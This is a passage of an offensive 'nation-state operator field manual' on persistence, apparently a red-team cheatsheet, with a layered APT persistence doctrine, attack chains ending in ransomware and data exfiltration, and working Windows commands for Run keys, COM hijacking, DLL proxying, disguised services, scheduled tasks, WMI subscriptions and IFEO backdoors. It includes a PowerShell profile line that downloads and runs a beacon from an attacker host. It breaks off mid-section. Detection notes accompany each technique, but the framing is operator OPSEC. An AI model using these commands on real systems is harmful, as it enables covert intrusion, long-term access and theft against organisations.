# Persistence — Nation-State Operator Field Manual

> **Classification:** Comprehensive persistence reference for APT operations. Every technique includes MITRE ATT&CK mapping, detection signatures (Event IDs, Sysmon, EDR indicators), OPSEC rating, survivability data, and cleanup cost. Organized by platform and privilege level.
>
> **Environment baseline:** Modern enterprise — Windows 10/11 + Server 2019/2022/2025, MDE-class EDR with AMSI/ETW/ASR/Tamper Protection/LSA Protection/Credential Guard, hybrid Entra ID with Conditional Access + PIM + MFA + Identity Protection + Authentication Strengths + Token Protection (native apps), **Microsoft Defender for Identity (MDI)** monitoring DCs, **Defender for Cloud Apps (MDCA)** for SaaS visibility, **Defender XDR** cross-product correlation, modern macOS (Ventura/Sonoma/Sequoia 15+) with **Background Task Management (BTM)** + Endpoint Security Framework consumers (CrowdStrike / SentinelOne / Jamf Protect / Sophos / Huntress), modern Linux with **Falco / Tetragon / Tracee** runtime security, K8s v1.36+ with fine-grained kubelet authz GA (24 April 2026).
>
> **Persistence-specific OPSEC taxonomy:** Each technique rated on:
> - **STEALTH** (LOW / MEDIUM / HIGH / VERY HIGH) — detectability at install + runtime
> - **SURVIVABILITY** — what events the persistence survives (reboot / passwd / OS update / reimage / cred rotation / EDR deploy)
> - **CLEANUP COST** (LOW / MEDIUM / HIGH / VERY HIGH) — operator effort to remove cleanly + defender effort to fully remediate
> - **DETECTION COST** — how much defender attention the persistence costs you on activation

---

### Support This Work

If these cheatsheets save you time, consider buying me a coffee.

<a href="https://www.buymeacoffee.com/NoVanity" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" height="50"></a>

**Or scan:**

<img src="https://github.com/MentalVibes/RedTeamCheatSheets/blob/4077a94d94806ba6e6513c29e1410bcda23894d1/qr-code.png" alt="Buy Me A Coffee QR" width="200">

**Crypto:**

| Currency | Address |
|----------|---------|
| **ETH** | `0x3844c08bb832b086d00dbbfec128cb31bdcca838` |

*Accepts ETH, USDC, and any ERC-20 token on Ethereum, Base, Polygon, and other EVM chains.*

---

## Table of Contents

- [0 — Persistence Survival Matrix](#0--persistence-survival-matrix)
- [1 — Layered Persistence Doctrine](#1--layered-persistence-doctrine)
- [2 — Windows: User-Level Persistence](#2--windows-user-level-persistence)
- [3 — Windows: System-Level Persistence](#3--windows-system-level-persistence)
- [4 — Windows: Kernel-Level Persistence](#4--windows-kernel-level-persistence)
- [5 — Windows: Domain-Level Persistence](#5--windows-domain-level-persistence)
- [6 — Windows: OPSEC & Detection Reference](#6--windows-opsec--detection-reference)
- [7 — Linux: User-Level Persistence](#7--linux-user-level-persistence)
- [8 — Linux: Root-Level Persistence](#8--linux-root-level-persistence)
- [9 — Linux: Kernel & Advanced Persistence](#9--linux-kernel--advanced-persistence)
- [10 — Linux: OPSEC & Detection Reference](#10--linux-opsec--detection-reference)
- [11 — macOS Persistence](#11--macos-persistence)
- [12 — Web Application & Marketplace Persistence](#12--web-application--marketplace-persistence)
- [13 — Container & Kubernetes Persistence](#13--container--kubernetes-persistence)
- [14 — Cloud & Identity-Plane Persistence](#14--cloud--identity-plane-persistence)
- [15 — Cleanup & Anti-Forensics](#15--cleanup--anti-forensics)
- [16 — Tool Quick Reference (Maintenance Status)](#16--tool-quick-reference-maintenance-status)
- [17 — MITRE ATT&CK Mapping Matrix](#17--mitre-attck-mapping-matrix)

---

## 0 — PERSISTENCE SURVIVAL MATRIX

```
MECHANISM                    │ REBOOT │ PASSWD │ OS UPD │ REIMAGE │ CRED ROT │ EDR DEPLOY
─────────────────────────────┼────────┼────────┼────────┼─────────┼──────────┼───────────
Registry Run Keys            │  Yes   │  Yes   │  Yes   │   No    │   Yes    │  Detected
Scheduled Tasks              │  Yes   │  Yes   │  Yes   │   No    │   Yes    │  Detected
Services                     │  Yes   │  Yes   │  Yes   │   No    │   Yes    │  Detected
WMI Event Subscriptions      │  Yes   │  Yes   │  Yes   │   No    │   Yes    │  Med-Hard
DLL Side-Loading             │  Yes   │  Yes   │ Maybe  │   No    │   Yes    │  Med-Hard
COM Hijacking                │  Yes   │  Yes   │  Yes   │   No    │   Yes    │  Hard
IFEO / SilentProcessExit     │  Yes   │  Yes   │  Yes   │   No    │   Yes    │  Hard
BITS Jobs                    │  Yes   │  Yes   │  Yes   │   No    │   Yes    │  Medium
Startup Folder               │  Yes   │  Yes   │  Yes   │   No    │   Yes    │  Detected
Accessibility Features       │  Yes   │  Yes   │   No   │   No    │   Yes    │  Medium
Active Setup                 │  Yes   │  Yes   │  Yes   │   No    │   Yes    │  Hard
Winlogon Helper              │  Yes   │  Yes   │  Yes   │   No    │   Yes    │  Medium
BYOVD + Boot-Start Driver    │  Yes   │  Yes   │  Yes   │   No    │   Yes    │  Very Hard
SCCM/Intune Agent Abuse      │  Yes   │  Yes   │  Yes   │  Yes**** │   Yes    │  Hard
WSUS Patch Poisoning         │  Yes   │  Yes   │ Reinst │  Yes**** │   Yes    │  Very Hard
Golden Ticket (AD)           │  Yes   │  Yes   │  Yes   │  Yes*   │   No**   │  N/A
Diamond / Sapphire Ticket    │  Yes   │  Yes   │  Yes   │  Yes*   │   No**   │  N/A
Golden Certificate (AD)      │  Yes   │  Yes   │  Yes   │  Yes*   │   Yes    │  N/A
Skeleton Key (AD)            │   No   │  Yes   │   No   │   No    │   Yes    │  Medium
SSH Authorized Keys          │  Yes   │  Yes   │  Yes   │   No    │   Yes    │  Low
Cron / Systemd Timer         │  Yes   │  Yes   │  Yes   │   No    │   Yes    │  Low
LD_PRELOAD                   │  Yes   │  Yes   │  Yes   │   No    │   Yes    │  Low
PAM Backdoor                 │  Yes   │  Yes   │ Maybe  │   No    │   Yes    │  Very Hard
Kernel Module / Rootkit      │  Yes   │  Yes   │ Maybe  │   No    │   Yes    │  Very Hard
eBPF Rootkit (LinkPro class) │  Yes   │  Yes   │ Maybe  │   No    │   Yes    │  Very Hard
UEFI/Firmware Implant        │  Yes   │  Yes   │  Yes   │  Yes    │   Yes    │  Very Hard
LSA Auth Package             │  Yes   │  Yes   │  Yes   │   No    │   Yes    │  Med-Hard
Shadow Credentials (AD)      │  Yes   │  Yes   │  Yes   │  Yes*   │   Yes    │  Medium
AZUREADSSOACC$ Backdoor      │  Yes   │  Yes   │  Yes   │  Yes*** │   Yes    │  Medium
ADFS Golden SAML             │  Yes   │  Yes   │  Yes   │  Yes*** │   Yes    │  Hard
SCIM-Provisioned User        │  N/A   │  N/A   │  N/A   │  Yes*** │   Yes    │  Very Hard
Subdomain Takeover           │  N/A   │  N/A   │  N/A   │  N/A    │   Yes    │  Hard
SSO IdP Admin Backdoor       │  N/A   │  N/A   │  N/A   │  Yes*** │   Yes    │  Hard
HashiCorp Vault Root Token   │  N/A   │  Yes   │  N/A   │  Yes*** │   No**   │  N/A
macOS LaunchAgent/Daemon     │  Yes   │  Yes   │ Maybe  │   No    │   Yes    │  Detected (BTM)
macOS Dylib Hijack           │  Yes   │  Yes   │ Maybe  │   No    │   Yes    │  Medium
Cloud IAM Backdoor           │  N/A   │  N/A   │  N/A   │  N/A    │   Yes    │  N/A
Federated Identity Cred (FIC)│  N/A   │  N/A   │  N/A   │  Yes*** │   Yes    │  Very Hard
OAuth App Persistence        │  N/A   │  N/A   │  N/A   │  N/A    │   Yes    │  N/A
Graph Subscription / Webhook │  N/A   │  N/A   │  N/A   │  N/A    │   Yes    │  N/A
EventBridge / Lambda Url     │  N/A   │  N/A   │  N/A   │  Yes**** │   Yes    │  N/A
Helm Chart / OCI Image       │  Yes   │  Yes   │  Yes   │   No    │   Yes    │  Hard
GitHub Actions Self-Hosted   │  Yes   │  Yes   │  Yes   │   No    │   Yes    │  Medium
  Runner
Mutating Webhook (K8s)       │  Yes   │  Yes   │  Yes   │   No    │   Yes    │  Hard
Browser Extension (Chrome/   │  Yes   │  Yes   │  Yes   │   No    │   Yes    │  Detected
  Edge/Firefox)
VS Code / IDE Extension      │  Yes   │  Yes   │  Yes   │   No    │   Yes    │  Med-Hard
Web Shell                    │  Yes   │  Yes   │ Maybe  │   No    │   Yes    │  Medium
DNS Provider Admin Backdoor  │  N/A   │  Yes   │  N/A   │  Yes*** │   Yes    │  Hard
Edge Function (Cloudflare    │  N/A   │  N/A   │  N/A   │  N/A    │   Yes    │  Hard
  Workers / Vercel / Netlify)
Backup System Persistence    │  Yes   │  Yes   │  Yes   │  Yes*** │   Yes    │  Very Hard
  (Veeam / Cohesity / Rubrik)
SCCM/Intune Mgmt-Agent Push  │  Yes   │  Yes   │  Yes   │  Yes**** │   Yes    │  Hard

* Golden Ticket / Certificate / Shadow Credentials: survives reimage only
   if AD/CA/PKI is not remediated
** Golden / Diamond / Sapphire Ticket: invalidated by resetting krbtgt 2x;
   wait between resets must exceed the domain's maximum ticket lifetime
   (default 10hr, but check domain Kerberos policy)
*** AZUREADSSOACC$ / ADFS Golden SAML / SCIM / FIC / SSO IdP / DNS / Backup
   System: invalidated by rolling the corresponding key/credential. On-prem
   AD reimage alone does NOT revoke cloud-side or external-system access.
**** SCCM/Intune/EventBridge/WSUS: agent-deployed payloads survive host
   reimage IF management infrastructure (server, Intune tenant, EventBridge
   rule) is not also remediated
```

---

## 1 — LAYERED PERSISTENCE DOCTRINE

```
═══════════════════════════════════════════════════════════
APT PERSISTENCE STRATEGY (2026 nation-state baseline)
═══════════════════════════════════════════════════════════
Deploy minimum 3-5 mechanisms across different layers SIMULTANEOUSLY.
Remediation of any single layer must NOT result in loss of access.

RECOMMENDED LAYERING:
├── Layer 1: User-level     (survives with user account — Run key, COM
│                            hijack, DLL sideload, browser ext, Login Item)
├── Layer 2: System-level   (survives user deletion — Service, Scheduled
│                            Task, WMI sub, LSA Auth Package)
├── Layer 3: Kernel-level   (survives EDR deployment — boot-start driver,
│                            rootkit via BYOVD chain, eBPF rootkit, UEFI)
├── Layer 4: Domain-level   (survives host reimage — Golden Ticket,
│                            Diamond/Sapphire Ticket, Golden Cert,
│                            AdminSDHolder, Shadow Creds on krbtgt)
├── Layer 5: Cloud/Identity (survives domain rebuild — OAuth app, IAM
│                            backdoor, PRT, FIC, Graph subscription,
│                            AZUREADSSOACC$, ADFS Golden SAML)
└── Layer 6: Supply / Mgmt  (survives entire-tenant rebuild — SCCM/Intune
                             agent injection, WSUS patch poisoning, MSP
                             trust relationship, Helm chart, GitHub
                             Actions self-hosted runner)

TIMING:
- Deploy persistence IMMEDIATELY after initial access — before enumeration
- Use lightweight mechanism first (SSH key, Run key), then upgrade
- Install domain-level persistence within hours of DA access
- Install cloud-side persistence within hours of identity-plane access
- Verify each mechanism INDEPENDENTLY before moving on

DIVERSITY:
- Mix registry, file-system, in-memory, and identity-plane techniques
- Use at least one technique the target's EDR doesn't cover well
- Ensure at least one mechanism works without network connectivity
  (for air-gapped recovery scenarios)
- Deploy persistence on multiple hosts, not just one
- Include at least one mechanism in each "blast-radius zone" (Tier 0
  identity, Tier 1 server, Tier 2 workstation, cloud subscription)

TYPICAL PERSISTENCE CHAINS (operator sequencing patterns):

  WORKSTATION FOOTHOLD CHAIN:
  Initial access (phish/OAuth/exploit) → User-level Run key or COM hijack
  (fast reversible fallback) → Privilege escalation → Service or scheduled
  task (admin-level) → DLL side-load into signed process (stealth tier) →
  migrate C2 beacon into side-loaded process → delete original dropper.

  DOMAIN COMPROMISE CHAIN:
  Tier 2 foothold → credential access (LSASS / DPAPI / browser) → lateral
  movement to Tier 0 → DCSync or Shadow Credentials write on krbtgt
  (requires equivalent rights) → Golden Certificate (survives krbtgt
  reset) → AdminSDHolder ACE (hourly SDProp propagation) → machine
  account quota backdoors on sacrificial hosts.

  HYBRID IDENTITY CHAIN (most common 2025-2026 nation-state pattern):
  On-prem compromise → DCSync or LSASS on ADFS / Entra Connect host →
  extract AZUREADSSOACC$ hash OR ADFS token signing cert OR Entra Connect
  MSOL_* sync account → forge Kerberos tickets for AZUREADSSOACC$ (cloud
  SSO forgery) OR forge SAML tokens (Golden SAML) → add credentials to
  existing service principal in Entra → graph API access as SP (no MFA,
  no CA). This chain SURVIVES on-prem AD rebuild.

  CLOUD-NATIVE CHAIN (2026 evolved):
  Valid cloud creds (phish / consent grant / leaked key / infostealer log)
  → enumerate via ROADtools / GraphRunner / Pacu / gcpwn → add federated
  identity credential (FIC) to existing managed identity (no on-tenant
  secret) → register Graph subscription with mailbox webhook (persistent
  data exfil) → register Automation runbook / Lambda / Cloud Function for
  scheduled beacon → cross-tenant access policy modification for B2B
  pivot persistence.

  CONTAINER / KUBERNETES CHAIN:
  Pod compromise → token theft (short-lived on v1.24+) → ServiceAccount
  with cluster-admin → manually-created long-lived Secret-based token →
  MutatingWebhook that injects sidecar into every new pod → DaemonSet
  with hostPath mount for node-level persistence → Helm chart compromise
  in internal registry for cluster-rebuild persistence.

  MANAGEMENT-PLANE CHAIN (2024-2026 nation-state escalation):
  AD foothold + management-server access → SCCM / Intune / Tanium admin
  compromise → push attacker payload via legitimate enterprise management
  channel to ALL managed endpoints simultaneously. Bypasses EDR because
  deployed by trusted mgmt agent. Bypasses re-image because management
  server re-pushes on next inventory cycle.

  EXTORTION-AND-RANSOMWARE CHAIN (financial-crime 2024-2026):
  Edge appliance exploit → internal pivot → Veeam backup server compromise
  (CVE-2025-23120) → exfil via legit backup channel → install ransomware
  via SCCM push → encrypt VMware ESXi datastores → extort with both
  exfilled data AND encrypted environment. Veeam compromise alone
  provides RESTORE-AS-ANYONE persistence even after IR thinks they've
  recovered.

  IDENTITY-PLANE CONTINUOUS-RECOVERY CHAIN (mature operator pattern):
  Initial OAuth grant → GraphRunner / GraphSpy continuous polling for
  new privileged accounts / cross-tenant policy changes / MFA-policy
  changes → automatic re-establishment of access via newly-discovered
  identity surface as defender revokes individual artifacts.
```

---

## 2 — WINDOWS: USER-LEVEL PERSISTENCE

> **Typical chains through this section:** User-level persistence as fast reversible fallback (Run key) → upgrade to stealth tier (DLL sideload, COM hijack) → migrate beacon into trusted process → delete original dropper. User-level techniques don't require admin but most are heavily monitored.

### 2.1 — Registry Run Keys (T1547.001)

```powershell
# ═══════════════════════════════════════════════════════════
# REGISTRY RUN KEYS — USER-LEVEL
# MITRE ATT&CK: T1547.001 (Registry Run Keys / Startup Folder)
# STEALTH: LOW (every EDR product monitors)
# SURVIVABILITY: Reboot ✓ Passwd ✓ OS Update ✓ Reimage ✗ EDR Deploy ✗
# CLEANUP COST: LOW (registry value delete)
# DETECTION COST: HIGH — high-fidelity alert on most EDR
# ═══════════════════════════════════════════════════════════

# Current user — executes on every logon
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "OneDriveSync" /t REG_SZ /d "C:\Users\Public\payload.exe" /f

# RunOnce — executes once, auto-deletes entry (fallback re-establishment)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Setup" /t REG_SZ /d "C:\Users\Public\stage2.exe" /f

# Less-monitored Run locations (still inventoried by Autoruns)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Startup" /t REG_EXPAND_SZ /d "C:\Users\Public\StartupFolder" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Startup" /t REG_SZ /d "C:\Users\Public\StartupFolder" /f

# DETECTION:
# - Sysmon Event ID 13 (registry value set), Event ID 12 (key create)
# - DeviceRegistryEvents in MDE/Defender XDR
# - Autoruns / PersistenceSniper inventory this exhaustively
# - Most EDR products monitor HKCU\...\Run as first-class signal

# OPSEC: Use only as fast fallback, not primary persistence. Pair with
# at least one stealth-tier mechanism (DLL sideload, COM hijack).
```

### 2.2 — Startup Folder (T1547.001)

```powershell
# ═══════════════════════════════════════════════════════════
# STARTUP FOLDER
# MITRE ATT&CK: T1547.001
# STEALTH: LOW    SURVIVABILITY: Reboot ✓ Passwd ✓ Reimage ✗
# CLEANUP COST: LOW (file delete)
# ═══════════════════════════════════════════════════════════
copy payload.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\OneDriveUpdate.exe"

# .lnk shortcut (less obvious than .exe)
$ws = New-Object -ComObject WScript.Shell
$s = $ws.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Update.lnk")
$s.TargetPath = "C:\Users\Public\payload.exe"
$s.WindowStyle = 7   # Minimized
$s.Save()

# DETECTION: Sysmon Event ID 11 (file create in Startup folder)
# OPSEC: Same as Run keys — heavily monitored
```

### 2.3 — COM Object Hijacking (T1546.015)

```powershell
# ═══════════════════════════════════════════════════════════
# COM OBJECT HIJACKING (HKCU overrides HKLM — no admin required)
# MITRE ATT&CK: T1546.015 (Component Object Model Hijacking)
# STEALTH: MEDIUM (rarely monitored per-CLSID; some EDR flag new HKCU CLSID)
# SURVIVABILITY: Reboot ✓ Passwd ✓ Reimage ✗ EDR Deploy varies
# CLEANUP COST: LOW (registry key delete) — but defender must FIND the key
# ═══════════════════════════════════════════════════════════
# Hijack a COM object frequently loaded — payload executes when object
# is instantiated. HKCU overrides HKLM for COM resolution, no admin needed.

# Discovery via Process Monitor:
# - Filter: RegOpenKey, HKCU\Software\Classes\CLSID, NAME NOT FOUND
# - Run target applications (explorer.exe, Office, etc.) → see which CLSIDs
#   they query via HKCU first

# Common high-value targets:
# - CLSIDs loaded by explorer.exe on every logon
# - CLSIDs loaded by Office on every document open
# - CLSIDs loaded by Outlook on every startup

# Hijack example (Thumbnail Cache Class Factory — explorer.exe loads):
reg add "HKCU\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" /ve /t REG_SZ /d "C:\Users\Public\payload.dll" /f
reg add "HKCU\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Both" /f

# DETECTION:
# - Sysmon Event ID 13 (CLSID registry set), but rarely monitored per-CLSID
# - Some EDR flag new InprocServer32 entries under HKCU
# - PersistenceSniper inventory; Autoruns COM tab

# OPSEC: Solid mid-tier user-level persistence. Pair with DLL sideload for
# the actual payload (so the loaded DLL itself is signed/legitimate-looking).
```

### 2.4 — DLL Side-Loading / Search Order Hijacking (T1574.001 / T1574.002)

```powershell
# ═══════════════════════════════════════════════════════════
# DLL SIDE-LOADING — SIGNED PROCESS LOADS MALICIOUS DLL
# MITRE ATT&CK: T1574.001 (Search Order Hijack), T1574.002 (Side-Loading)
# STEALTH: HIGH — but mature 2026 EDR detects unsigned DLL load from
#                 user-writable path regardless of host process signature
# SURVIVABILITY: Reboot ✓ Passwd ✓ Reimage ✗
# CLEANUP COST: MEDIUM (find the signed binary + companion DLL)
# DETECTION COST: MEDIUM — Sysmon Event ID 7 with anomalous path
# ═══════════════════════════════════════════════════════════

# DISCOVERY (Process Monitor):
# Filter: Operation=CreateFile, Result=NAME NOT FOUND, Path ends with .dll
# Run target applications → see which DLLs they try to load from CWD first.

# KNOWN VULNERABLE SIGNED BINARIES (search-order hijack candidates):
# - OneDrive updater (OneDriveStandaloneUpdater.exe) → version.dll from CWD
# - Microsoft Teams (Update.exe) → various DLLs from app dir
# - Zoom (Zoom.exe) → DLLs from install dir
# - Many vendor updaters load DLLs from user-writable locations
# - Cisco WebEx / Cisco Secure Client installer helpers
# - Notepad++ updater, 7-Zip updater, WinSCP updater, VLC updater

# Create proxy DLL (forwards exports to real DLL, executes payload):
# SharpDLLProxy (Flangvik) — generates C source code for proxy DLL:
SharpDllProxy.exe --dll C:\Windows\System32\version.dll --payload shellcode.bin
# Output: version_orig.dll (renamed original) + version_pragma.c (C source)
# Compile version_pragma.c in Visual Studio (DLL C++ project)
# Resulting proxy DLL loads shellcode.bin, forwards all export calls to
# the renamed original.

# Alternative: HopHouse SharpDLLProxy — accepts binary or command instead
# of shellcode:
SharpDllProxy.exe --dll version.dll --command "C:\ProgramData\svc.exe"

# DETECTION:
# - Sysmon Event ID 7 (image loaded) with non-standard DLL path
# - DeviceImageLoadEvents in MDE/Defender XDR
# - EDR with cloud-delivered protection: behavioral rule on signed-binary
#   loading unsigned DLL from user-writable path is a first-class signal
#   in 2026 (CrowdStrike Falcon, S1, MDE)
# - ASR rule "Block executable files from running unless they meet a
#   prevalence, age, or trusted list criteria" — partial coverage

# OPSEC: HIGH stealth on legacy / less-mature EDR; MEDIUM against modern
# 2026 stack. Best paired with delivery via ZIP drop in user's downloads
# (cross-ref initial access §3.3).
```

### 2.5 — PowerShell Profile (T1546.013)

```powershell
# ═══════════════════════════════════════════════════════════
# POWERSHELL PROFILE
# MITRE ATT&CK: T1546.013 (PowerShell Profile)
# STEALTH: MEDIUM    SURVIVABILITY: Reboot ✓ Passwd ✓
# CLEANUP COST: LOW (file edit)
# DETECTION: ScriptBlock logging Event ID 4104; FIM on profile path
# ═══════════════════════════════════════════════════════════
# PowerShell loads profile scripts on every session start.
# Locations:
#   $HOME\Documents\PowerShell\Microsoft.PowerShell_profile.ps1 (PS 7+)
#   $HOME\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1 (PS 5.1)

echo 'Start-Process -WindowStyle Hidden -FilePath "C:\Users\Public\payload.exe"' >> $PROFILE

# Stealthier in-memory variant:
echo 'IEX(New-Object Net.WebClient).DownloadString("http://attacker/beacon.ps1")' >> $PROFILE

# DETECTION:
# - File modification on profile path (FIM)
# - ScriptBlock logging Event ID 4104 captures the executed cmdlets
# - EDR: moderate — ScriptBlock logging catches the execution

# OPSEC: Only fires when PowerShell is opened. Useful against developer /
# admin targets who use PowerShell frequently; low yield against typical
# end users.
```

### 2.6 — Browser Extension Persistence (User-Level)

```
═══════════════════════════════════════════════════════════
BROWSER EXTENSION PERSISTENCE — USER-LEVEL
MITRE ATT&CK: T1176 (Browser Extensions)
STEALTH: HIGH (signed extension from official Web Store)
SURVIVABILITY: Reboot ✓ Passwd ✓ Reimage ✗ Cred Rotation ✗
CLEANUP COST: MEDIUM (uninstall extension; revoke Chrome account sync)
DETECTION: Chrome Enterprise Reporting Connector flags unmanaged install
═══════════════════════════════════════════════════════════
(See §12.6 for full coverage — listed here at user-level for taxonomy)

QUICK INSTALL:
  - Operator-uploaded extension on Chrome Web Store / Edge Add-ons /
    Firefox Add-ons (passes Web Store review for low-attention payloads)
  - User clicks install link → extension persists across browser restart
  - Capabilities: cookie API access (App-Bound Encryption irrelevant for
    extensions), tab content read, network requests, message passing to
    attacker C2

CYBERHAVEN PRECEDENT (Dec 2024):
  - Compromise of legitimate extension developer's Google account via
    OAuth phishing → push malicious update to existing extension →
    400k+ Cyberhaven users + cascade to 30+ extensions affecting 2.6M
    users
  Source: https://www.cyberhaven.com/blog/cyberhavens-chrome-extension-security-incident-and-what-were-doing-about-it

POST-CYBERHAVEN OPERATOR LANDSCAPE 2025-2026:
  - Direct extension publish (auth-stealing mid-tier) — Web Store review
    catches obvious malicious extensions but mid-quality phishing tooling
    persists weeks-to-months
  - Extension hijack via maintainer compromise — same OAuth phishing
    pattern continues; defenders started Two-Step Verification mandates
    for Web Store developers Q2 2025
  - Hidden updates via compromised CI/CD that publishes extensions
```

```
═══════════════════════════════════════════════════════════
SECTION 2 — RELATED & FOLLOW-ON
═══════════════════════════════════════════════════════════
Enables → §3 system-level upgrade (after privesc)
Enables → §12 web-app persistence (browser extension parallels)
Cross-ref → Initial access §3.7 browser extension delivery
Cross-ref → §6.4 Defender Stack reference (Windows-side)
NEVER → Stop at user-level only — Layer 2/3/4 required for nation-state
        persistence depth
```

---

## 3 — WINDOWS: SYSTEM-LEVEL PERSISTENCE

> **Typical chains through this section:** Privesc to admin → service / scheduled task / WMI subscription as primary persistence → LSA Auth Package or SilentProcessExit as stealth-tier secondary → SCCM/Intune agent abuse for management-plane persistence (cross-ref §3.13).

### 3.1 — Scheduled Tasks (T1053.005)

```powershell
# ═══════════════════════════════════════════════════════════
# SCHEDULED TASKS
# MITRE ATT&CK: T1053.005 (Scheduled Task)
# STEALTH: LOW-MEDIUM (heavily monitored; XML import quieter than schtasks)
# SURVIVABILITY: Reboot ✓ Passwd ✓ Reimage ✗
# CLEANUP COST: LOW
# DETECTION COST: HIGH on schtasks.exe path
# ═══════════════════════════════════════════════════════════

# Method 1 — schtasks.exe (standard; generates Event ID 4698)
schtasks /create /tn "\Microsoft\Windows\Maintenance\WinSvcHost" /tr "C:\Windows\Temp\svc.exe" /sc onlogon /ru SYSTEM /f
schtasks /create /tn "\Microsoft\Windows\NetTrace\Health" /tr "powershell -ep bypass -w hidden -f C:\ProgramData\health.ps1" /sc daily /st 09:00 /ru SYSTEM /f
# On idle (less suspicious timing):
schtasks /create /tn "\Microsoft\Windows\Defrag\OptimizeVolume" /tr "C:\ProgramData\svc.exe" /sc onidle /i 10 /ru SYSTEM /f

# Method 2 — Raw XML import (stealthier — bypasses some schtasks.exe logging)
# Drop XML directly into C:\Windows\System32\Tasks\Microsoft\Windows\<folder>
# Register via COM object or task scheduler API — avoids schtasks.exe process

# DETECTION:
# - Event ID 4698 (task created) in Security log
# - Microsoft-Windows-TaskScheduler/Operational Event ID 106 (registered)
# - Sysmon Event ID 1 (schtasks.exe process)
# - DeviceProcessEvents in MDE for schtasks.exe with suspicious args

# OPSEC: Place task under \Microsoft\Windows\ to blend with legitimate.
# XML import method bypasses some schtasks.exe-specific detections but
# the Task Scheduler operational log still captures the registration.
```

### 3.2 — Services (T1543.003)

```powershell
# ═══════════════════════════════════════════════════════════
# WINDOWS SERVICES
# MITRE ATT&CK: T1543.003 (Windows Service)
# STEALTH: LOW-MEDIUM (heavily monitored)
# SURVIVABILITY: Reboot ✓ Passwd ✓ Reimage ✗
# CLEANUP COST: LOW
# DETECTION COST: HIGH (Event 7045, EDR ServiceInstalled)
# ═══════════════════════════════════════════════════════════
sc create "WinDiagSvc" binpath= "C:\Windows\Temp\svc.exe" start= auto obj= LocalSystem
sc description "WinDiagSvc" "Windows Diagnostic Data Collection Service"
sc failure "WinDiagSvc" reset= 86400 actions= restart/60000/restart/60000/restart/60000
sc start "WinDiagSvc"

# PowerShell:
New-Service -Name "WinDiagSvc" -BinaryPathName "C:\Windows\Temp\svc.exe" -DisplayName "Windows Diagnostic Data Service" -StartupType Automatic

# DETECTION:
# - Event ID 7045 (System log) — new service installed
# - Event ID 4697 (Security log — requires audit policy)
# - DeviceEvents ActionType="ServiceInstalled" (MDE)
# - Sysmon Event ID 13 (registry key for service)
# - sc.exe process creation visible

# OPSEC: Name to blend (WinDiag*, Svc*, wua*, Update*, MS*). Service
# creation is one of the top-tier detection signals — use only as
# secondary persistence; never as sole layer.
```

### 3.3 — WMI Event Subscription (T1546.003)

```powershell
# ═══════════════════════════════════════════════════════════
# WMI EVENT SUBSCRIPTION (Permanent Consumer)
# MITRE ATT&CK: T1546.003 (WMI Event Subscription)
# STEALTH: MEDIUM (Sysmon detects, but fileless trigger is valuable)
# SURVIVABILITY: Reboot ✓ Passwd ✓ Reimage ✗
# CLEANUP COST: MEDIUM (find filter + consumer + binding)
# DETECTION: Sysmon 19/20/21
# ═══════════════════════════════════════════════════════════
$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name = "SysFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240"
}
$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name = "SysConsumer"
    CommandLineTemplate = "C:\ProgramData\svc.exe"
}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter = $filter
    Consumer = $consumer
}

# DETECTION:
# - Sysmon Event ID 19 (WmiEventFilter), 20 (WmiEventConsumer),
#   21 (WmiEventConsumerToFilter binding)
# - WMI-Activity/Operational Event ID 5861 (permanent event registered)
# - Most modern EDR detects WMI subscription creation
# - DeviceEvents ActionType=Wmi* in MDE

# OPSEC: Detected by Sysmon/EDR but runs as SYSTEM and is fileless
# trigger. Pair with file-based payload that runs only when triggered.
```

### 3.4 — Image File Execution Options (T1546.012)

```powershell
# ═══════════════════════════════════════════════════════════
# IFEO DEBUGGER + SILENTPROCESSEXIT VARIANT
# MITRE ATT&CK: T1546.012 (Image File Execution Options Injection)
# STEALTH: MEDIUM (IFEO Debugger) to HIGH (SilentProcessExit)
# SURVIVABILITY: Reboot ✓ Passwd ✓ Reimage ✗
# ═══════════════════════════════════════════════════════════

# IFEO Debugger — payload triggers when target program LAUNCHES
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "C:\ProgramData\svc.exe" /f
# Choose targets that run frequently or on specific admin actions:
# sethc.exe, utilman.exe, osk.exe, narrator.exe (accessibility — pre-auth)

# SilentProcessExit — payload triggers when target EXITS (stealthier)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 0x200 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /t REG_SZ /d "C:\ProgramData\svc.exe" /f

# DETECTION:
# - Sysmon Event ID 13 (IFEO registry mods)
# - DeviceRegistryEvents in MDE
# - Most EDR detect IFEO Debugger changes especially on accessibility binaries
# - SilentProcessExit (uses WER infrastructure) is LESS commonly monitored

# OPSEC: SilentProcessExit is HIGH stealth — leverages Windows Error
# Reporting, rarely flagged by default rulesets.
```

### 3.5 — Accessibility Features Replacement (T1546.008)

```powershell
